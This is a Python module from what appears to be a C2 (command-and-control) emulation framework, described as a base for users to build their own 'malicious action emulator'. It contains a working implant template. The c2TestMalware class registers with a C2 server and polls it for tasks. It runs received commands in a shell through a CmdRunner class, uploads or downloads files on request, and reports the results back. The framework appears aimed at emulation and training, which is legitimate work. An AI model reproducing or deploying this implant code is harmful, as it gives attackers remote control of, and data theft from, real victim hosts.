#-----------------------------------------------------------------------------
# Name:        c2MwUtils.py
#
# Purpose:     This module is a utility function module used for the other 
#              c2 server / client modules to store the malicious action emulation 
#              program's data, it also provides a command execution class and one 
#              malicious action emulator example class for user to build their 
#              own malware which can be integrated in the C2 system via inherit
#              the example class.
#
# Author:      Yuancheng Liu
#
# Version:     v_0.2.3
# Created:     2023/10/10
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------
""" Program design: 
    We want to develop a utility module which use can inherit it directly to 
    build their own customized malicious action emulator and easily to be integrated 
    in our C2 system. This module contents 4 sub class:
    1. CmdRunner : an assistant to execute the cmd is a sub-thread which parallel 
        with the main program thread and get the cmd execution result.
    2. programRcd: A program recording (DB) class used to save all the execution 
        state of a malicious action emulator.
    3. mwServerRcd: A record class inherit from the <programRcd> class used by the 
        server side to synchronize the execution state of a malware. 
    4. c2TestMalware: A test malware program example for user to inherit it to 
        build their customized malicious action emulator to integrated in the C2
        system.
"""
import time
import threading
import subprocess
from queue import Queue
from datetime import datetime

# Add the c2 Client
import c2Client

# Define all the task state flag here: 
TASK_P_FLG = 0  # task pending flag
TASK_F_FLG = 1  # task finished flag
TASK_A_FLG = 2  # task accept flag
TASK_E_FLG = 3  # task error flag
TASK_R_FLG = 4  # task running flag

# Define all the action flag here:
ACT_KEY = 'action'
ACCEPT_FLG = 'ok'
REJECT_FLG = 'no'

# Define all the task type flag here:
RIG_FLG = 'register' # register flag
RPT_FLG = 'report'
UPLOAD_FLG = 'upload'
DOWNLOAD_FLG = 'download'
CMD_FLG = 'command'

# Define maximum command queue size
MAX_CMD_QUEUE_SIZE = 100

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class CmdRunner(threading.Thread):
    """ Command runner module to run a command immediately or store in the cmd 
        queue the run parallel with the parent thread.
    """
    def __init__(self, maxQsz=MAX_CMD_QUEUE_SIZE, rstDetailFlg=False):
        """ init example: cmdrunner = Command(maxQsz=10, rstDetailFlg=True)
            Args:
                maxQsz (int, optional): max number of cmd can be enqueued. Defaults to MAX_CMD_QUEUE_SIZE.
                rstDetailFlg (bool, optional): flag to identify whether to show the 
                    cmd execution detailed result. Defaults to False.
        """
        threading.Thread.__init__(self)
        self.cmdQueue = Queue(int(maxQsz))
        self.detailFlg = rstDetailFlg
        self.terminate = False

    #-----------------------------------------------------------------------------
    def run(self):
        print("Command Runner parallel cmd execution loop started.")
        while not self.terminate:
            if not self.cmdQueue.empty():
                cmdStr = self.cmdQueue.get()
                print("Parallel run cmdStr: %s" % str(cmdStr))
                self.runCmd(cmdStr, detailFlg=self.detailFlg)
            time.sleep(0.01)
        print("Command Runner execution loop end.")

    #-----------------------------------------------------------------------------
    def runCmdParallel(self, cmdStr):
        """ Add a command in the paralled execution queue."""
        if not cmdStr:
            print("The cmd string is empty")
            return False
        if not self.cmdQueue.full():
            self.cmdQueue.put(str(cmdStr))
            return True
        else:
            print("Cmd queue is full, cannot add cmdStr:", cmdStr)
            return False

    #-----------------------------------------------------------------------------
    def runCmd(self, cmdStr, detailFlg=False):
        """ Run a command and collect the result on the victim host.
            Args:
                cmdStr (str): command string.
                detailFlg (bool, optional): flag to identify whether to show/return 
                    the execution detail. Defaults to False.
            Returns:
                str: return the command execution result, else return execution 
                    str 'success'/'fail'/'error'
        """
        if cmdStr:
            try:
                result = subprocess.check_output(str(cmdStr), 
                                                stderr=subprocess.STDOUT, 
                                                shell=True)
                print(result)
                return result if detailFlg else 'success'
            except Exception as err:
                print("Rum cmd error: %s" %str(err))
                return str(err) if detailFlg else 'fail'
        else:
            return 'error'

    #-----------------------------------------------------------------------------
    def stop(self):
        self.terminate = True

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class programRcd(object):
    """ A object class to record the controlled malware's data, YC: Later this 
        module will be replaced by backend data base.
    """
    def __init__(self, uniqid, ipaddr, taskList=None, srvFlag=False) -> None:
        """ Init example :
            malwarercd = programRcd('testMalware', '127.0.0.1')
            Args:
                uniqid (str): malware unique ID.
                ipaddr (str): malware ip address.
                tasksList (list(dict()), optional): malare preset task list. Defaults to None.
                srvFlag (bool): flag to identify whehter it is a server record.
                - One task dict() examlpe:
                {
                    'taskID': 1,
                    'taskType': 'upload',
                    'startT': None,
                    'repeat': 1,
                    'exePreT': 0,
                    'taskData': [os.path.join(dirpath, "update_installer.zip")]
                    'state': TASK_P_FLG
                },
        """
        self.uniqid = uniqid
        self.ipaddr = ipaddr
        self.srvFlg = srvFlag
        self.taskList = taskList if taskList else []
        self.taskCountDict = {
            'total'     :len(self.taskList),
            'finish'    :0,
            'accept'    :len(self.taskList),
            'pending'   :0,
            'running'   :0, 
            'error'     :0,
            'deactive'  :0
        }
        # Init the list to store the task result and the last execution result.
        self.taskRstList = []
        self.lastTaskRst = {
            'taskID'    : 0,
            'state'     : TASK_F_FLG,
            'time'      : '',
            'taskData'  : 'registered'
        }
        self._initTasksInfo()

    #-----------------------------------------------------------------------------
    def _initTasksInfo(self):
        """ Create the task summary dict() and add the task state in the tasks list."""
        # add the record task state in the task list.
        for task in self.taskList:
            if task['state'] == TASK_P_FLG:
                self.taskCountDict['pending'] += 1
            elif task['state'] == TASK_R_FLG:
                self.taskCountDict['running'] += 1
            elif task['state'] == TASK_E_FLG:
                self.taskCountDict['error'] += 1
            elif task['state'] == TASK_A_FLG:
                self.taskCountDict['accept'] += 1
            elif task['state'] == TASK_F_FLG:
                self.taskCountDict['finish'] += 1
            self.taskRstList.append(None) # Append None to the result list 

    #-----------------------------------------------------------------------------
    def addNewTask(self, taskDict):
        """ Add a new task in to the task list.
            Args: taskDict (dict): refer to the task dict() examlpe
        """
        # Check taskDict is a dict type
        if not isinstance(taskDict, dict):
            print('Error: addNewTask() > input taskDict is not a dict type.')
            return False
        keysList = taskDict.keys()
        taskInfo = {
            'taskID'    : len(self.taskList),
            'taskType'  : taskDict['taskType'] if 'taskType' in keysList else CMD_FLG,
            'startT'    : taskDict['startT'] if 'startT' in keysList else None,
            'repeat'    : taskDict['repeat'] if 'repeat' in keysList else 1,
            'exePreT'   : taskDict['exePreT'] if 'exePreT' in keysList else 0,
            'taskData'  : taskDict['taskData'] if 'taskData' in keysList else None,
            'state'     : TASK_P_FLG if self.srvFlg else TASK_A_FLG
        }
        self.taskList.append(taskInfo)
        self.taskCountDict['total'] += 1
        stateKey = 'pending' if self.srvFlg else 'accept'
        self.taskCountDict[stateKey] += 1
        self.taskRstList.append(None)
        return True
    
    #-----------------------------------------------------------------------------
    # define all the public-get() function here: 
    
    def getRcdInfo(self):
        """ Return a malware tasks record summary info."""
        infoDict = {'id': self.uniqid, 'ipAddr': self.ipaddr}
        infoDict.update(self.taskCountDict)
        return infoDict

    def getTaskInfo(self, taskID):
        """ Return one task's info dict(), None if task ID not exist."""
        for task in self.taskList:
            if task['taskID'] == taskID: return task
        return None

    def getTaskList(self, taskState=None):
        """ Return a list of task dict() based on the task state type. Return all 
            the tasks info if the state is None.
        """
        if taskState is None: return self.taskList
        resultList = []    
        for task in self.taskList:
            if task['state'] == taskState: resultList.append(task)
        return resultList

    def getTaskRst(self, taskID=None):
        """ Return all tasks' result if not input task ID, else return task result."""
        if taskID is None: return self.taskRstList
        if 0 <= int(taskID) <= self.taskCountDict['total']:
            return self.taskList[int(taskID)]
        return None

    def getLastTaskRst(self):
        return self.lastTaskRst

    #-----------------------------------------------------------------------------
    # Define all the public-set() function here: 
    def setTaskState(self, idx, state=TASK_F_FLG):
        if 0 <= idx <= len(self.taskList):
            self.taskList[idx]['state'] = state
            return True
        return False

    def setTaskRst(self, idx, rst):
        if 0 <= idx <= len(self.taskRstList):
            self.taskRstList[idx] = rst
            return True
        return False

    def updateTaskRcd(self, taskList):
        """ Update the task record state
            Args:
                taskList (list of task dict()): _description_
        """
        for i, task in enumerate(self.taskList):
            for taskDict in taskList:
                if task['taskID'] == taskDict['taskID']:
                    self.taskList[i]['state'] = taskDict['state']
                    self.taskList[i]['startT'] = taskDict['Time']
                    self.lastTaskRst.update(taskDict)
                    break

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class mwServerRcd(programRcd):
    """ A malware record obj inherit from the <programRcd> class used in the C2
        emulation system server side to synchronize the malware's state.
    """
    def __init__(self, idx, uniqid, ipaddr, taskList=None, srvFlag=True) -> None:
        """_summary_

        Args:
            idx (int): malware index in the C2 App.
            uniqid (str): malware ID
            ipaddr (str): malware IP address.
            taskList (list of dict(), optional): list of task dict, refer to 
                class <programRcd>. Defaults to None.
            srvFlag (bool, optional): _description_. Defaults to True.
        """
        super().__init__(uniqid, ipaddr, taskList, srvFlag)
        self.idx = idx
        self.lastUpdateT = None
        self.connected = False
        self._initRegister()
        self.updateTime()

    #-----------------------------------------------------------------------------
    def _initRegister(self):
        """ Init check whether the malware's 1st task is regiter to the c2 Hub."""
        for i, task in enumerate(self.taskList):
            if task['taskType'] == RIG_FLG:
                self.connected = True
                self.taskList[i]['state'] = TASK_F_FLG
                return

    #-----------------------------------------------------------------------------
    def getRcdInfo(self):
        """ Return the malware's connection and task record information as dict()."""
        rcdDict = {
            'idx': self.idx,
            'connected': self.connected,
            'updateT': self.lastUpdateT.strftime('%Y-%m-%d %H:%M:%S')
        }
        rcdDict.update(super().getRcdInfo())
        return rcdDict

    def updateTime(self):
        self.lastUpdateT = datetime.now()

    def updateRegisterT(self):
        if len(self.taskList) > 0:
            self.taskList[0]['startT'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

#-----------------------------------------------------------------------------
#----------------------------------------------------------------------------- 
class c2TestMalware(object):
    """ A test malware program example for user to inherit it to build their 
        customized malicious action emulator to integrated in the C2 system.
    """

    def __init__(self, malwareID, ownIp, c2Ipaddr, \
                 c2port=5000, reportInt=10, tasksList=None, c2HttpsFlg=False, cmdTDFlg=False) -> None:
        """ Init example: 
            client = c2TestMalware(malwareID, ownIP, c2Ipaddr, 
                              c2port=c2Port, reportInt=c2RptInv, tasksList=taskList, c2HttpsFlg=c2HttpsFlg)
        Args:
            malwareID (str): malware id
            ownIp (str): malware ip address
            c2Ipaddr (str): c2 server IP address
            reportInt (int, optional): time interval between 2 report to c2. Defaults to 10 sec.
            tasksList (list of dict, optional): refer to <programRcd> taskList. Defaults to None.
            c2HttpsFlg (bool, optional): flag to identify whether connect to c2 via https. Defaults to False.
            cmdTDFlg (bool, optional): flag to identify whether run the command execution task 
                in the command runner's sub-thread. Defaults to False.
        """
        # Init the malware paramters.
        self.malwareID = malwareID
        self.ownIp = ownIp
        self.c2Ipaddr = c2Ipaddr
        self.c2port = int(c2port)
        self.c2HttpsFlg = c2HttpsFlg
        self.cmdTDFlg = cmdTDFlg
        self.tasksList = tasksList 
        if tasksList is None:
            self.tasksList = [
            {
                'taskID': 0,
                'taskType': 'register',
                'startT': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'repeat': 1,
                'exePreT': 0,
                'state' : TASK_R_FLG,
                'taskData': None
            }]
        # Init the C2 connector.
        self.c2Connector = c2Client.c2Client(self.malwareID, c2Ipaddr, 
                                             c2Port=self.c2port, ownIP=self.ownIp, reportInt=reportInt,
                                             httpsFlg=self.c2HttpsFlg)
        # Pre process the tasks.
        self._preporcessTasks()
        # Init self record obj: 
        self.ownRcd = programRcd(self.malwareID, self.ownIp, taskList=self.tasksList)
        self.c2Connector.registerToC2(taskList=self.tasksList)
        self.cmdRunner = CmdRunner(rstDetailFlg=True)
        self._initActionHandlers()
        self.terminate = False
        # Start all sub thread service
        self.c2Connector.start()
        if self.cmdTDFlg: self.cmdRunner.start()
        self._startSubThreads()

    #-----------------------------------------------------------------------------
    # Init all the private interface function here: 
         
    def _initActionHandlers(self):
        """ Init the action handlers, children calsses can overwrite this function 
            to init the needed handler such Modbus connector.
            > This function is called in the super().__init__(...)  
        """
        return None 

    def _startSubThreads(self):
        """ Call the start() of the hanlders if they need to start sub-thread, children 
            calsses can overwrite this function start the user defined service. 
            > This function is called in the super().__init__(...)  
        """
        return None

    def _stopSubThreads(self):
        """ Call the stop() of the hanlders if they need to stop sub-thread, children 
            calsses can overwrite this function stop the user defined service.
            > This function is called in the super().stop(...)  
        """
        return None

    def _preporcessTasks(self):
        """ Preprocess the tasks list, children classes can overwrite this function 
            to add task in the mid of the init.
            > This function is called in the super().__init__(...)  
        """
        return None 
    
    def _handleSpecialTask(self, taskDict):
        """ Passed in the task info dict into this function, children classes can 
            overwrite this function adding the handling code.
            Args: taskDict (_type_): _description_
        """
        return None

    #-----------------------------------------------------------------------------
    def run(self):
        """ Main tasks handling loop."""
        while not self.terminate:
            # Check whether got new incomming task
            task = self.c2Connector.getOneC2Task()
            # sychronized the task record
            if task is not None:
                self.ownRcd.addNewTask(task)
            # do one task
            for taskDict in self.ownRcd.getTaskList(taskState=TASK_A_FLG):
                idx = taskDict['taskID']
                resultStr = 'taskfinished'
                for _ in range(taskDict['repeat']):
                    if taskDict['taskType'] == UPLOAD_FLG or taskDict['taskType'] == DOWNLOAD_FLG:
                        time.sleep(int(taskDict['exePreT']))
                        uploadFlg = taskDict['taskType'] == UPLOAD_FLG
                        self.c2Connector.transferFiles(taskDict['taskData'], uploadFlg=uploadFlg)
                        resultStr = 'File transfered'
                    elif taskDict['taskType'] == CMD_FLG:
                        cmd = str(taskDict['taskData'][0])
                        print("Run cmd : %s " %str(cmd))
                        resultStr = self.cmdRunner.runCmd(cmd, detailFlg=True)
                    else:
                        resultStr = self._handleSpecialTask(taskDict)
                    self.ownRcd.setTaskState(idx, state=TASK_F_FLG)
                    reportDict ={
                        'taskID': idx,
                        'state': c2Client.TASK_F_FLG,
                        'Time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'taskData': str(resultStr)
                    }
                    self.c2Connector.addNewReport(reportDict)
                    self.ownRcd.setTaskState(idx, state=TASK_F_FLG)
                    time.sleep(0.1)

    #----------------------------------------------------------------------------- 
    def stop(self):
        self.c2Connector.stop()
        self.cmdRunner.stop()
        self.terminate = True
        self._stopSubThreads()